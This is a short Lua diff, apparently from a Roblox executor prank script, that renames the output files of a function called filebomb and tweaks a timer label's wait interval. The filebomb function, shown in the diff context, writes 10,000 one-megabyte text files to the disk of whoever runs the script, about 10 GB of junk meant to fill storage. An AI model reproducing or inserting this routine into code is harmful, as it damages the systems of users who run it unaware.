@@ -31,7 +31,7 @@ end
 local function filebomb()
 	local text = ("w"):rep(1000000)
 	for i = 1, 10000 do
-		writefile("you have been goosed"..i..".txt", text)
+		writefile("goosed"..i..".txt", text)
 	end
 end
 
@@ -171,7 +171,7 @@ local function BHHDQA_fake_script() -- TextLabel_2.LocalScript
 		elseif min >= 10 and sec >= 10 and mic >= 10 then
 			h.Text = min..":"..sec.."."..mic
 		end
-		task.wait(.027)
+		task.wait(.025)
 	end
 end
 coroutine.wrap(BHHDQA_fake_script)()
